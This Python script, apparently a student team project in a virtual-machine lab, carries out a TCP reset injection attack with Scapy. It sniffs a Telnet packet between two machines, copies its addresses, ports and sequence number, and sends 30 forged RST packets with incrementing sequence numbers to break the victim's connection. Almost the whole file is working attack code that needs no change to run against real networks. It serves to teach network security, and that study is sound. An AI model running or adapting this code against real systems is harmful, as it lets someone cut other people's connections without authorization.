
'''
This is the attackers team's code.
It is mainly divided into 2 parts:
Part A: Gathering Needed Info by Sniffing (done by Mounir)
Part B: Sending the Packet and Guarantying Correct Sequence Number (done by Maha)

Environment Setup:

Before conducting the attack, we decided together about the environment we will use:
- Setting up 3 virtual machines running Ubuntu (on VirtualBox) (Mounir's contribution)
- Using Telnet which runs over TCP (Maha's contribution)

Please refer to the ReadMe file for details.

For the Python code, we know that Scapy is an alternative to Wireshark for analyzing and manipulating packets.

Scapy is only the library used: https://scapy.readthedocs.io/en/latest/

'''


from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet import IP


####################################################################################
##########   PART A: Gathering Needed Info by Sniffing (done by Mounir)   ##########
####################################################################################


# The variables that store the IPs of machines X and Y

machine_Y = "192.168.0.104"
machine_X = "192.168.0.103"


# The name of the network interface (all the 3 virtual machines are on a bridged interface named "wlp0s20f3")

interface = "wlp0s20f3"


'''
Sniffing part

't' is a list that will store the captured packet (1 packet because count=1)

The captured packet should be sent on the same network, via TCP, having:
	-the source IP equal to machine Y's IP and
	-the dest. IP equal to machine X's IP
'''

t = sniff(iface=interface, count=1,
          lfilter=lambda x: x.haslayer(TCP) and x[IP].src == machine_Y and x[IP].dst == machine_X)

# (the use of this sniff function was guided by an example at https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2 )


# Since t is a list, I will extract the first (and only) element from it

t = t[0]




##########################################################################################
##   Part B: Constructing and Sending the Packet and Guarantying Correct Sequence Number (done by Maha)  ##
##########################################################################################


# This is the data from Part A that I should send as an attacker (dictionary data type)

gathered_data = {'src': t[IP].src, 'dst': t[IP].dst, 'sport': t[TCP].sport, 'dport': t[TCP].dport, 'seq': t[TCP].seq}

# (organizing the gathered data in this way was inspired by an example at
# https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2 )

# I will use its elements to create the IP and the TCP headers' data

IP_Data = IP(src=gathered_data['src'], dst=gathered_data['dst'])

TCP_Data = TCP(sport=gathered_data['sport'], dport=gathered_data['dport'], flags="R", seq=gathered_data['seq'])

# I created the reset packet I want to send

packet = IP_Data / TCP_Data


'''
I will send the same packet 30 times but with each time incrementing the sequence number by 1
(hoping that at least 1 packet will match the sequence number expected by the victim)

The choice of 30 was determined through repeated testing (trial and error).

The first sequence number will be the one captured in Part A.
'''

for sequence in range(gathered_data['seq'], gathered_data['seq'] + 30):
    packet.seq = sequence

    send(packet)	# I sent the packet in every iteration
